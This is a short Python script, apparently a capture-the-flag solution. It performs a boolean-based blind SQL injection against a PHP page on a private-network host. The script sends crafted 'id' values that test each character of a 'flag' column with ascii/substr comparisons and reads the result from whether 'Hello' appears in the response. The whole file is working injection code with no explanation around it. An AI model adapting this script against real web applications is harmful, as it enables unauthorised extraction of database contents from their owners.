import requests
import time

url = "http://192.168.15.80:20005/index.php";

result = ""
num = 0  # 用了来判断是不是flag已经拼完整了
for i in range(1, 60):
    time.sleep(0.2)

    if num == 1:
        break

    for j in range(32, 128):

        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)" % (i, j);
        # print(str((i-1)*96+j-32)+":~"+payload+"~")

        data = {
            "id": payload,
        }

        r = requests.post(url, data=data)

        r.encoding = r.apparent_encoding

        if "Hello" in r.text:
            x = chr(j)
            result += str(x)
            print(result)
            break

        if "}" in result:
            print(result)
            num = 1
            break
